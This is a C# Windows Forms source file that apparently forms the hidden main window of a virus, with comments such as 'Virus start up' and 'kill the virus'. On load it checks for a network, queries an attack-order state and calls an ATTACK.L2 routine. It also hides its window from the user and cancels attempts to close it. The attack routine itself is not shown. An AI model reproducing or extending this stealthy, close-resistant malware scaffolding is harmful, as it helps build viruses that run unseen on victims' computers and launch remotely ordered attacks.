using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace SDV
{
    internal partial class HIDDENMAINVIR : Form
    {
        public HIDDENMAINVIR()
        {
            InitializeComponent();
        }
        // Virus start up
        private void HIDDENMAINVIR_Load(object sender, EventArgs e)
        {
            if (System.Windows.Forms.SystemInformation.Network)
            {
                bool isactive = AttackOrder.GetState();
                if (isactive)
                {
                                               
                            ATTACK.L2();
                     
                                    }
                else
                {
                    // kill the virus
                    Tools.close = true;
                    Application.Exit();
                }
            }
            else
            {
                // kill the virus
                Tools.close = true;
                Application.Exit();
            }
        }

        private void HIDDENMAINVIR_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!Tools.close)
                e.Cancel = true;
                     
        }

        private void HIDDENMAINVIR_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }

    }
}
